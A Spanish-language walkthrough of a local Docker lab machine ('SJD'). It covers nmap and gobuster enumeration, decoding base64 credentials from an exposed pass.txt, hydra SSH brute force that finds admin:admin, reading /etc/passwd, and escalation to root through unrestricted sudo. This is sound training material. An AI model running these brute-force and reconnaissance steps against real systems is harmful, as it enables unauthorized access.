## DESCARGA Y DESPLIEGUE DEL DOCKER

Descargamos el zip en nuestra maquina
1-Descomprimimos
```bash
unzip sjd.zip
```

2- eliminamos el zip por limpieza

```bash
rm sjd.z
```

3-Desplegamos el docker
```bash
 sudo bash auto_deploy.sh sjd.tar
```

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```
docker funcionando y montado

## COMPROBACION DE CONECTIVIDAD

Enviamos una traza icmp a la ip

```bash
ping -c 1 172.17.0.2
```

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.078 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.078/0.078/0.078/0.000 ms
```

1 paquete recibido 0% perdido, la maquina esta montada.


## FASE EBUNERACIÓNO
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
Explicación del comando
1: sudo: Ejecuta el comando Nmap con privilegios de superusuario, necesarios para algunos tipos de escaneo.

2: nmap: Herramienta para escanear puertos y servicios en redes.

2: -sS (TCP SYN Scan): Realiza un escaneo TCP SYN ("half-open") para detectar puertos abiertos de forma eficiente y discreta.

3: -sCV (Service and Version Detection):

4: -sC: Ejecuta scripts de detección estándar de Nmap (similar a --script=default).

5: -sV: Detecta versiones de los servicios que se están ejecutando en los puertos abiertos.

6: -Pn: Desactiva la detección de host ("ping scan") para asumir que el host está activo, incluso si no responde a ICMP.

7: --min-rate 5000: Fuerza a Nmap a enviar al menos 5000 paquetes por segundo, acelerando el escaneo.

8: -p-: Escanea todos los puertos TCP (0-65535).

9: -vvv: Modo de verbosidad muy alto, mostrando información detallada del escaneo.

10: --open: Muestra solo los puertos abiertos en el resultado.

11: 172.17.0.2: Dirección IP del objetivo del escaneo.

12: -oN PuertosYservicios: Guarda el resultado del escaneo en un archivo llamado PuertosYservicios en formato de salida normal.


como salida obtenemos:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e3:6b:e1:c3:e0:14:74:3e:df:a3:f1:d8:64:69:80:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhOyatZz1JZg9nfiirmBWKav6nix/oCL958+T96mIAFk0/e2lV7xVmYD9VzycFeGimMzhWSsQN4jI3fS9dxf5Y=
|   256 17:ce:1a:bb:ef:6d:9e:9d:c2:41:41:0b:0f:82:32:0d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKHeG1nQCVp6bvxQskAMw1m9TG+UnvQBDd6UMzbDzLY
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Reparaci\xC3\xB3n de Computadoras SJD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

vemos servicios corriendo por:

-puerto 22 SSH (sin credenciales no podemoshacer nada) y version no vulnerable a enumeracion de usuarios

-puerto 80 http

Nos centraremos en el protocolo http pero antes de ir a la web lanzamos un whatweb:
```bash
whatweb http://172.17.0.2
```
```
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[silvio@delacal.com.ar], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[Reparación de Computadoras SJD]
```
lo único que podemos es ver el email, pero sin saber si es un ejemplo o que como mucho tener en cuenta un posible user,
accedemos a la web y miramos que nos encontramos.
miramos el código fuente con ctrl+c y no vemos nada interesante.
sin nada que hacer pues vamos a fuzzear un poco:
```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,txt,php
```
** Explicación del comando

1 gobuster Herramienta para realizar fuerza bruta en rutas, subdominios y otras estructuras web

2 dir Modo de escaneo de directorios y archivos en el servidor objetivo

3 -u "http://172.17.0.2/" URL objetivo donde se realizará el escaneo

4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
4.1 -w Especifica el diccionario a usar
4.2 Aquí se utiliza el archivo directory-list-2.3-medium.txt de dirbuster, que contiene nombres comunes de directorios y archivos

5 -x txt,html,php
5.1 Busca archivos con extensiones específicas txt, html, php

tenemos esta salida:
```
===============================================================
/img                  (Status: 301) [Size: 306] [--> http://172.17.0.2/img/]
/index.php            (Status: 200) [Size: 6968]
/index1.html          (Status: 200) [Size: 10703]
/pass.txt             (Status: 200) [Size: 42]
/descargas.html       (Status: 200) [Size: 4468]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882184 / 882188 (100.00%)
```

/pass.txt tremendamente sospechoso no?, pues nos vamos a esa ruta
```
http://172.17.0.2/pass.txt
```

y vemos esto:
```
sjd c2pkCg==
admin YWRtaW4K
root MTk3MQo=

vamos a hacer un decode de base 64 de lo que vemos
```bash
echo "c2pkCg==" | base64 -d;echo
```
```
sjd
```
```bash
echo "YWRtaW4K" | base64 -d;echo
```
```
admin
```
```bash
echo "MTk3MQo=" | base64 -d;echo
```
```
1971
```
nos queda pues una lista de usuarios y una pass?
creo dos diccionarios uno con los user:
```
sjd
admin
root
```
y otro con los pass:
```
sjd
admin
1971
```

pues vamos a intentar acceder por ssh y vamos a ver credenciales

## FASE INTRUSIÓN:

```bash
hydra -L user.txt   -P pass.txt -t 16 -V -f -I ssh://172.17.0.2
```
```
** Explicación del comando

1 hydra Herramienta para realizar ataques de fuerza bruta a servicios remotos

2 -L user.txt Especifica el archivo que contiene una lista de posibles nombres de usuario

3 -P pass.txt Especifica el archivo que contiene una lista de posibles contraseñas

4 -t 16 Define el número de tareas (hilos) concurrentes; en este caso, 16

5 -V Activa el modo detallado, mostrando cada intento de usuario y contraseña

6 -f Detiene el ataque una vez que se encuentra una combinación válida

7 -I Ignora comprobaciones previas, forzando el ataque

8 ssh://172.17.0.2 Protocolo (SSH) y dirección IP del objetivo
```
En la salida vemos esto:

```
[22][ssh] host: 172.17.0.2   login: admin   password: admin
```
usuario admin contraseá admin...xD

Nos conectamos por ssh:
```bash
ssh admin@172.17.0.2
```
con la contraseña...admin
Ya estamos dentro.

## FASE ESCALADA DE PRIVILEGIOS

Provamos a mirar si estamos en alfún grupo interesante:
```
id
uid=1003(admin) gid=1003(admin) groups=1003(admin),100(users)
```
y...no, miramos la variable de entorno
```
printenv
SHELL=/bin/bash
PWD=/home/admin
LOGNAME=admin
HOME=/home/admin
LANG=C.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
SSH_CONNECTION=172.17.0.1 42852 172.17.0.2 22
TERM=xterm-256color
USER=admin
SHLVL=1
SSH_CLIENT=172.17.0.1 42852 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/printenv
```
nada relevante, ojo que me he llegado a ver aquí contraseás en texto claro
Miramos usuarios :
```
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
admin:x:1003:1003:,,,:/home/admin:/bin/bash
sjd:x:1001:1001:,,,:/home/sjd:/bin/bash
```
ahora toca mirar si tenemos algún privilegio sudo:
```
sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on 8b209e5d837a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on 8b209e5d837a:
    (ALL) ALL
```
.....puedo ejecutar como cualquier usuario....lo que quiera?
```
admin@8b209e5d837a:~$ sudo su
root@8b209e5d837a:/home/admin# 
```

y hasta aquí esta máquina básica pero entretenida


